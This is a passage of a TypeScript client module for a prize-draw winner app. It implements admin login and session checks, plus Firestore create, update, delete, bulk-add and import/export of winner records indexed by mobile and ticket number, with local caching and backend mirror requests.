    console.warn('API check-result failed:', err);
  }

  return {
    found: false,
    isWinner: false,
    drawDate: getCachedDrawDate(),
    message: `No registered winning ticket found for ${clean} in Draw ${getCachedDrawDate()}.`
  };
}

// Verify admin token with backend
export async function verifyAdminSession(): Promise<'valid' | 'invalid' | 'error'> {
  const token = getAdminToken();
  if (!token) return 'invalid';

  try {
    const res = await fetch('/api/admin/verify', {
      headers: { Authorization: `Bearer ${token}` }
    });
    if (res.ok) return 'valid';
    if (res.status === 401) {
      adminLogout();
      return 'invalid';
    }
    return 'error';
  } catch {
    return 'error';
  }
}

// Admin Login
export async function adminLogin(
  password: string
): Promise<{ success: boolean; token?: string; error?: string }> {
  try {
    const res = await fetch('/api/admin/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ password })
    });
    const data = await res.json();
    if (res.ok && data.token) {
      localStorage.setItem(TOKEN_KEY, data.token);
      return { success: true, token: data.token };
    }
    return { success: false, error: data.error || 'Authentication failed' };
  } catch {
    return { success: false, error: 'Network error connecting to backend server.' };
  }
}

export function getAdminToken(): string | null {
  return localStorage.getItem(TOKEN_KEY);
}

export function adminLogout(): void {
  localStorage.removeItem(TOKEN_KEY);
}

// Admin Get All Winners (Reads from Cloud Firestore when admin is connected!)
export async function fetchAllWinners(): Promise<{ winners: WinnerRecord[]; unauthorized?: boolean }> {
  if (isCloudAdminSignedIn()) {
    try {
      const settings = await getFirestoreSettingsDoc();
      if (settings && settings.initialized) {
        const snapshot = await getDocs(collection(db, 'winners'));
        const list = snapshot.docs
          .map((d) => docToWinnerRecord(d.id, d.data()))
          .sort((a, b) => {
            const ta = a.updatedAt ? Date.parse(a.updatedAt) : 0;
            const tb = b.updatedAt ? Date.parse(b.updatedAt) : 0;
            return tb - ta;
          });
        localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify(list));
        return { winners: list };
      }
    } catch (err) {
      handleFirestoreError(err, OperationType.LIST, 'winners');
    }
  }

  const token = getAdminToken();
  try {
    const res = await fetch('/api/admin/winners', {
      headers: { Authorization: `Bearer ${token}` }
    });
    if (res.status === 401) {
      adminLogout();
      return { winners: [], unauthorized: true };
    }
    if (res.ok) {
      const data = await res.json();
      if (Array.isArray(data.winners)) {
        localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify(data.winners));
        return { winners: data.winners };
      }
    }
  } catch (err) {
    console.warn('Could not fetch from backend, returning cached data:', err);
  }
  return { winners: getLocalCacheWinners() };
}

// Admin Create Winner (Strictly persists permanently to Cloud Firestore)
export async function createWinner(
  winner: Omit<WinnerRecord, 'id'>
): Promise<{
  success: boolean;
  winner?: WinnerRecord;
  error?: string;
  unauthorized?: boolean;
  requiresCloudConnect?: boolean;
}> {
  if (!isCloudAdminSignedIn()) {
    return { success: false, requiresCloudConnect: true, error: CLOUD_REQUIRED_ERROR };
  }

  const token = getAdminToken();
  const generatedId = 'win-' + Date.now().toString(36) + Math.random().toString(36).substring(2, 6);
  let mutable;
  try {
    mutable = sanitizeWinnerMutableFields(winner);
  } catch (err: any) {
    return { success: false, error: err?.message || 'Winner name, mobile number, and ticket number are required.' };
  }

  let fsWinner: WinnerRecord;
  try {
    const batch = writeBatch(db);
    const nowIso = new Date().toISOString();

    batch.set(doc(db, 'winners', generatedId), {
      id: generatedId,
      ...mutable,
      createdAt: serverTimestamp(),
      updatedAt: serverTimestamp()
    });

    const tKey = toTicketLookupKey(mutable.ticketNo);
    const lookupPayload = {
      winnerId: generatedId,
      ...mutable,
      updatedAt: serverTimestamp()
    };
    for (const mKey of getMobileLookupKeys(mutable.mobile)) {
      batch.set(doc(db, 'lookup_by_mobile', mKey), lookupPayload);
    }
    for (const ticketKey of getTicketLookupKeys(mutable.ticketNo)) {
      batch.set(doc(db, 'lookup_by_ticket', ticketKey), lookupPayload);
    }

    // Add ticket into prize tier if not present (never re-seed DEFAULT_PRIZES if prizes doc is initialized)
    const prizeSnap = await getDocLive(doc(db, 'prizes', 'current'), 'prizes/current');
    const currentPrizes = prizeSnap.exists()
      ? firestoreDocToPrizesMap(prizeSnap.data())
      : firestoreDocToPrizesMap({});
    const tierArr = [...(currentPrizes[mutable.prizeTier] || [])];
    if (!tierArr.includes(mutable.ticketNo)) {
      tierArr.unshift(mutable.ticketNo);
    }
    currentPrizes[mutable.prizeTier] = tierArr.slice(0, 5000);

    if (prizeSnap.exists()) {
      const field = TIER_TO_FIELD[mutable.prizeTier] || 'fourthPrize';
      batch.update(doc(db, 'prizes', 'current'), {
        [field]: sanitizeTicketArray(currentPrizes[mutable.prizeTier]),
        updatedAt: serverTimestamp()
      });
    } else {
      batch.set(doc(db, 'prizes', 'current'), prizesMapToFirestorePayload(currentPrizes));
    }

    // Set as active live winner
    const currentSettings = (await getFirestoreSettingsDoc()) || getCachedSettings();
    batch.set(
      doc(db, 'settings', 'public'),
      buildPublicSettingsPayload({
        ...currentSettings,
        activeWinnerId: generatedId,
        activeTicketKey: tKey
      })
    );

    await batch.commit();
    fsWinner = { id: generatedId, ...mutable, createdAt: nowIso, updatedAt: nowIso };
    saveWinnerToLocalCache(fsWinner);
    localStorage.setItem(PRIZES_STORAGE_KEY, JSON.stringify(currentPrizes));
  } catch (err) {
    handleFirestoreError(err, OperationType.WRITE, `winners/${generatedId}`);
  }

  if (token) {
    fetch('/api/admin/winners', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${token}`
      },
      body: JSON.stringify(winner)
    }).catch(() => {});
  }

  return { success: true, winner: fsWinner! };
}

// Admin Bulk Add Multiple Winners (Strictly Cloud Firestore)
export async function bulkCreateWinners(
  winnersList: Array<Omit<WinnerRecord, 'id'>>
): Promise<{
  success: boolean;
  count?: number;
  error?: string;
  message?: string;
  unauthorized?: boolean;
  requiresCloudConnect?: boolean;
}> {
  if (!isCloudAdminSignedIn()) {
    return { success: false, requiresCloudConnect: true, error: CLOUD_REQUIRED_ERROR };
  }
  if (!Array.isArray(winnersList) || winnersList.length === 0) {
    return { success: false, error: 'At least one valid winner record is required.' };
  }

  const token = getAdminToken();
  let fsCreatedCount = 0;

  try {
    const batch = writeBatch(db);
    const prizeSnap = await getDocLive(doc(db, 'prizes', 'current'), 'prizes/current');
    const currentPrizes = prizeSnap.exists()
      ? firestoreDocToPrizesMap(prizeSnap.data())
      : firestoreDocToPrizesMap({});

    let firstWinnerId = '';
    let firstTicketKey = '';

    for (const item of winnersList) {
      const cleanName = String(item.name || '').trim();
      const cleanTicket = String(item.ticketNo || '').trim().toUpperCase();
      const cleanMobile = String(item.mobile || '').trim();
      if (!cleanName || !cleanTicket || !cleanMobile) continue;

      const wId = 'win-' + Date.now().toString(36) + Math.random().toString(36).substring(2, 7);
      const mutable = sanitizeWinnerMutableFields(item);
      if (!firstWinnerId) {
        firstWinnerId = wId;
        firstTicketKey = toTicketLookupKey(mutable.ticketNo);
      }

      batch.set(doc(db, 'winners', wId), {
        id: wId,
        ...mutable,
        createdAt: serverTimestamp(),
        updatedAt: serverTimestamp()
      });

      const lookupPayload = {
        winnerId: wId,
        ...mutable,
        updatedAt: serverTimestamp()
      };
      for (const mKey of getMobileLookupKeys(mutable.mobile)) {
        batch.set(doc(db, 'lookup_by_mobile', mKey), lookupPayload);
      }
      for (const tKey of getTicketLookupKeys(mutable.ticketNo)) {
        batch.set(doc(db, 'lookup_by_ticket', tKey), lookupPayload);
      }

      const tierArr = [...(currentPrizes[mutable.prizeTier] || [])];
      if (!tierArr.includes(mutable.ticketNo)) tierArr.unshift(mutable.ticketNo);
      currentPrizes[mutable.prizeTier] = tierArr.slice(0, 5000);
      fsCreatedCount++;
    }

    if (fsCreatedCount === 0) {
      return { success: false, error: 'Each winner must include real Name, Ticket No, and Mobile No.' };
    }

    batch.set(doc(db, 'prizes', 'current'), prizesMapToFirestorePayload(currentPrizes));
    const currentSettings = (await getFirestoreSettingsDoc()) || getCachedSettings();
    batch.set(
      doc(db, 'settings', 'public'),
      buildPublicSettingsPayload({
        ...currentSettings,
        activeWinnerId: firstWinnerId,
        activeTicketKey: firstTicketKey
      })
    );
    await batch.commit();
    localStorage.setItem(PRIZES_STORAGE_KEY, JSON.stringify(currentPrizes));
  } catch (err) {
    handleFirestoreError(err, OperationType.WRITE, 'winners');
  }

  if (token) {
    fetch('/api/admin/winners/bulk', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${token}`
      },
      body: JSON.stringify({ winnersList })
    }).catch(() => {});
  }

  return {
    success: true,
    count: fsCreatedCount,
    message: `${fsCreatedCount} winner records saved permanently to Cloud Database!`
  };
}

// Admin Update Winner (Strictly Cloud Firestore)
export async function updateWinner(
  id: string,
  updates: Partial<WinnerRecord>
): Promise<{
  success: boolean;
  winner?: WinnerRecord;
  error?: string;
  unauthorized?: boolean;
  requiresCloudConnect?: boolean;
}> {
  if (!isCloudAdminSignedIn()) {
    return { success: false, requiresCloudConnect: true, error: CLOUD_REQUIRED_ERROR };
  }
  if (!isValidFirestoreId(id)) {
    return { success: false, error: 'Invalid winner ID' };
  }

  const token = getAdminToken();
  let fsWinner: WinnerRecord;

  try {
    const winnerRef = doc(db, 'winners', id);
    const existingSnap = await getDocLive(winnerRef, `winners/${id}`);
    const prevData = existingSnap.exists() ? existingSnap.data() : {};
    const mergedInput: Partial<WinnerRecord> = {
      ...prevData,
      ...updates
    };
    const mutable = sanitizeWinnerMutableFields(mergedInput);
    const batch = writeBatch(db);

    if (existingSnap.exists()) {
      batch.update(winnerRef, {
        ...mutable,
        updatedAt: serverTimestamp()
      });
    } else {
      batch.set(winnerRef, {
        id,
        ...mutable,
        createdAt: serverTimestamp(),
        updatedAt: serverTimestamp()
      });
    }

    // Clean old lookup keys if mobile/ticketNo changed
    const oldMobileKeys = prevData.mobile ? getMobileLookupKeys(prevData.mobile) : [];
    const oldTicketKeys = prevData.ticketNo ? getTicketLookupKeys(prevData.ticketNo) : [];
    const newMobileKeys = getMobileLookupKeys(mutable.mobile);
    const newTicketKeys = getTicketLookupKeys(mutable.ticketNo);

    for (const oldM of oldMobileKeys) {
      if (!newMobileKeys.includes(oldM)) {
        batch.delete(doc(db, 'lookup_by_mobile', oldM));
      }
    }
    for (const oldT of oldTicketKeys) {
      if (!newTicketKeys.includes(oldT)) {
        batch.delete(doc(db, 'lookup_by_ticket', oldT));
      }
    }

    const lookupPayload = {
      winnerId: id,
      ...mutable,
      updatedAt: serverTimestamp()
    };
    for (const mKey of newMobileKeys) {
      batch.set(doc(db, 'lookup_by_mobile', mKey), lookupPayload);
    }
    for (const tKey of newTicketKeys) {
      batch.set(doc(db, 'lookup_by_ticket', tKey), lookupPayload);
    }

    // Add updated ticket into prize section if not present (never re-seed DEFAULT_PRIZES if missing)
    const prizeSnap = await getDocLive(doc(db, 'prizes', 'current'), 'prizes/current');
    const currentPrizes = prizeSnap.exists()
      ? firestoreDocToPrizesMap(prizeSnap.data())
      : firestoreDocToPrizesMap({});
    const tierArr = [...(currentPrizes[mutable.prizeTier] || [])];
    if (!tierArr.includes(mutable.ticketNo)) {
      tierArr.unshift(mutable.ticketNo);
      currentPrizes[mutable.prizeTier] = tierArr.slice(0, 5000);
      if (prizeSnap.exists()) {
        const field = TIER_TO_FIELD[mutable.prizeTier] || 'fourthPrize';
        batch.update(doc(db, 'prizes', 'current'), {
          [field]: sanitizeTicketArray(currentPrizes[mutable.prizeTier]),
          updatedAt: serverTimestamp()
        });
      } else {
        batch.set(doc(db, 'prizes', 'current'), prizesMapToFirestorePayload(currentPrizes));
      }
    }

    await batch.commit();
    fsWinner = { id, ...mutable, updatedAt: new Date().toISOString() };
    updateWinnerInLocalCache(fsWinner);
  } catch (err) {
    handleFirestoreError(err, OperationType.UPDATE, `winners/${id}`);
  }

  if (token) {
    fetch(`/api/admin/winners/${id}`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${token}`
      },
      body: JSON.stringify(updates)
    }).catch(() => {});
  }

  return { success: true, winner: fsWinner! };
}

// Admin Delete Winner (deletes permanently from Firestore winners + lookup indexes + updates activeWinnerId)
export async function deleteWinner(
  id: string
): Promise<{
  success: boolean;
  winners?: WinnerRecord[];
  activeWinnerId?: string;
  error?: string;
  unauthorized?: boolean;
  requiresCloudConnect?: boolean;
}> {
  if (!isCloudAdminSignedIn()) {
    return { success: false, requiresCloudConnect: true, error: CLOUD_REQUIRED_ERROR };
  }
  if (!isValidFirestoreId(id)) {
    return { success: false, error: 'Invalid winner ID' };
  }

  const token = getAdminToken();
  let fsRemaining: WinnerRecord[] = [];
  let fsNextActiveId = '';

  try {
    const winnerRef = doc(db, 'winners', id);
    const snap = await getDocLive(winnerRef, `winners/${id}`);
    const batch = writeBatch(db);

    if (snap.exists()) {
      const wData = snap.data();
      for (const mKey of getMobileLookupKeys(wData.mobile || '')) {
        batch.delete(doc(db, 'lookup_by_mobile', mKey));
      }
      for (const tKey of getTicketLookupKeys(wData.ticketNo || '')) {
        batch.delete(doc(db, 'lookup_by_ticket', tKey));
      }
      batch.delete(winnerRef);
    } else {
      await deleteDoc(winnerRef).catch(() => {});
    }

    const allSnap = await getDocs(collection(db, 'winners'));
    const remainingDocs = allSnap.docs.filter((d) => d.id !== id);
    fsRemaining = remainingDocs.map((d) => docToWinnerRecord(d.id, d.data()));

    const currentSettings = await getFirestoreSettingsDoc();
    if (currentSettings && currentSettings.activeWinnerId === id) {
      const nextWinner = fsRemaining[0] || null;
      fsNextActiveId = nextWinner?.id || '';
      batch.set(
        doc(db, 'settings', 'public'),
        buildPublicSettingsPayload({
          ...currentSettings,
          activeWinnerId: fsNextActiveId,
          activeTicketKey: nextWinner ? toTicketLookupKey(nextWinner.ticketNo) : ''
        })
      );
    } else {
      fsNextActiveId = currentSettings?.activeWinnerId || '';
    }

    await batch.commit();
    deleteWinnerFromLocalCache(id);
    localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify(fsRemaining));
  } catch (err) {
    handleFirestoreError(err, OperationType.DELETE, `winners/${id}`);
  }

  if (token) {
    fetch(`/api/admin/winners/${id}/delete`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${token}` }
    }).catch(() => {});
  }

  return { success: true, winners: fsRemaining, activeWinnerId: fsNextActiveId };
}

// Admin Export All Data for Backup (prefers authoritative Cloud Firestore when connected)
export async function exportAllData(): Promise<{
  success: boolean;
  data?: any;
  error?: string;
  unauthorized?: boolean;
}> {
  if (isCloudAdminSignedIn()) {
    try {
      const [settings, prizeTickets, winnersRes] = await Promise.all([
        fetchPublicSettings(),
        fetchPrizeTickets(),
        fetchAllWinners()
      ]);
      return {
        success: true,
        data: {
          settings,
          prizeTickets,
          winners: winnersRes.winners
        }
      };
    } catch {
      // fall through to Express
    }
  }

  const token = getAdminToken();
  try {
    const res = await fetch('/api/admin/data/export', {
      headers: { Authorization: `Bearer ${token}` }
    });
    const data = await res.json();
    if (res.status === 401) {
      adminLogout();
      return { success: false, unauthorized: true, error: data.error || 'Session expired. Please log in again.' };
    }
    return { success: res.ok, data: data.data, error: data.error };
  } catch {
    return { success: false, error: 'Network error exporting data' };
  }
}

// Admin Import Unlimited Data (Strictly Cloud Firestore)
export async function importAllData(
  dataObj: any
): Promise<{
  success: boolean;
  message?: string;
  error?: string;
  unauthorized?: boolean;
  requiresCloudConnect?: boolean;
}> {
  if (!isCloudAdminSignedIn()) {
    return { success: false, requiresCloudConnect: true, error: CLOUD_REQUIRED_ERROR };
  }
  if (!dataObj || typeof dataObj !== 'object') {
    return { success: false, error: 'Invalid JSON data format' };
  }

  try {
    const batch = writeBatch(db);
    if (dataObj.prizeTickets && typeof dataObj.prizeTickets === 'object') {
      batch.set(doc(db, 'prizes', 'current'), prizesMapToFirestorePayload(dataObj.prizeTickets));
    }
    if (Array.isArray(dataObj.winners)) {
      for (const w of dataObj.winners) {
        if (!w?.name || !w?.mobile || !w?.ticketNo) continue;
        const wId = isValidFirestoreId(String(w?.id || ''))
          ? String(w.id)
          : 'win-' + Date.now().toString(36) + Math.random().toString(36).substring(2, 6);
        const mutable = sanitizeWinnerMutableFields(w);
        batch.set(doc(db, 'winners', wId), {
          id: wId,
          ...mutable,
          createdAt: serverTimestamp(),
          updatedAt: serverTimestamp()
        });
        const lookupPayload = { winnerId: wId, ...mutable, updatedAt: serverTimestamp() };
        for (const mKey of getMobileLookupKeys(mutable.mobile)) {
          batch.set(doc(db, 'lookup_by_mobile', mKey), lookupPayload);
        }
        for (const tKey of getTicketLookupKeys(mutable.ticketNo)) {
          batch.set(doc(db, 'lookup_by_ticket', tKey), lookupPayload);
        }
      }
    }
    if (dataObj.settings) {
      batch.set(doc(db, 'settings', 'public'), buildPublicSettingsPayload(dataObj.settings));
    }
    await batch.commit();
  } catch (err) {
    handleFirestoreError(err, OperationType.WRITE, 'settings/public');
  }

  const token = getAdminToken();
  if (token) {
    fetch('/api/admin/data/import', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${token}`
      },
      body: JSON.stringify({ data: dataObj })
    }).catch(() => {});
  }

  return { success: true, message: 'Data imported permanently into Cloud Database!' };
}

export async function changeAdminPassword(
  currentPassword: string,
  newPassword: string
): Promise<{ success: boolean; error?: string; unauthorized?: boolean }> {
  const token = getAdminToken();
  try {
    const res = await fetch('/api/admin/change-password', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${token}`
      },
      body: JSON.stringify({ currentPassword, newPassword })
    });
    const data = await res.json();
    if (res.status === 401) {
      adminLogout();
      return { success: false, unauthorized: true, error: data.error || 'Session expired. Please log in again.' };
    }
    if (res.ok) {
      return { success: true };
    }
    return { success: false, error: data.error || 'Failed to update password' };
  } catch {
    return { success: false, error: 'Network error while updating password' };
  }
}

// Local storage persistent helpers
function getLocalCacheWinners(): WinnerRecord[] {
  try {
    const raw = localStorage.getItem(LOCAL_STORAGE_KEY);
    if (raw) {
      const list = JSON.parse(raw);
      if (Array.isArray(list)) return list;
    }
  } catch {}
  return [];
}

function saveWinnerToLocalCache(winner: WinnerRecord): void {
  const current = getLocalCacheWinners();
  const exists = current.findIndex((w) => w.id === winner.id || w.ticketNo === winner.ticketNo);
  if (exists !== -1) {
    current[exists] = winner;
  } else {
    current.unshift(winner);
  }
  localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify(current));
}

function updateWinnerInLocalCache(winner: WinnerRecord): void {
  const current = getLocalCacheWinners();
  const idx = current.findIndex((w) => w.id === winner.id);
  if (idx !== -1) {
    current[idx] = winner;
  } else {
    current.push(winner);
  }
  localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify(current));
}

function deleteWinnerFromLocalCache(id: string): void {
  const current = getLocalCacheWinners();
  const filtered = current.filter((w) => w.id !== id);
  localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify(filtered));
}
